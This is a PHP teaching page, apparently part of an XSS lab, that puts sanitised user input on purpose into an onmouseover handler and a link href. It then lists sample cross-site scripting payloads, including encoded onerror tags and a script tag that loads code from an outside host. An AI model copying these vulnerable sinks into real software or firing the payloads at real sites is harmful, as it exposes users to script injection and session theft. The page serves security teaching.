<?php
$raw_input="";

if(isset($_REQUEST['xssme'])) $raw_input=$_REQUEST['xssme'];
echo "' ".clean_for_output($raw_input,true)." '<br><br> ";
echo "<hr>let's be really stupid and put that in an event listener for you<br>";
echo "<code>&lt;div style='background-color: #f00; width: 50px; height: 50px;' onmouseover='".clean_for_output($raw_input,true)."'>&lt;/div></code><br>";
echo "<div style='background-color: #f00; width: 50px; height: 50px;' onmouseover='".clean_for_output($raw_input,true)."'></div><br>";
echo "Mouseover the red square to activate your javascript..<br><br>";

echo "<hr>let's be really stupid again and put that in an a href for you<br>";
echo "<code>&lt;a href='".clean_for_output($raw_input,true)."'>Click Here&lt;/a></code><br>";
echo "<a href='".clean_for_output($raw_input,true)."'>Click Here</a><br><br>";
?>
<hr>


<h2>Or try any of these examples:</h2>
<ul>
<li>alert(1);</li>
<li>' onerror=alert(String.fromCharCode(88,83,83,50));</li>
<li>&lt;script&gt;alert(&quot;a basic xss attack&quot;)&lt;/script&gt;</li>
<li>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</li>
<li>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</li>
<li>&lt;IMG onerror=alert(String.fromCharCode(88,83,83,50)) src=""&gt;</li>
<li>&lt;img src=x onerror=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</li>
</ul>
<hr>
<h3>Try other flavours..</h3>

<a href="xss-attack-vulnerable.php">NO PROTECTION</a> XSS<br>
<a href="xss-attack-htmlentities.php">htmlentities</a> Still XSS if you are stupid<br>
<a href="xss-attack-htmlspsecialchars.php">htmlspecialchars</a> Still XSS if you are stupid<br>
<a href="xss-attack-strip_tags.php">strip_tags</a> Still XSS<br>
<a href="xss-attack-me.php">xss-attack-me</a> Throw anything at this one.. NO XSS<br>

<hr>
REFERENCE:<BR>
<a href="http://www.paulosyibelo.com/2014/07/bypassing-htmlentities.html">http://www.paulosyibelo.com/2014/07/bypassing-htmlentities.html</a>
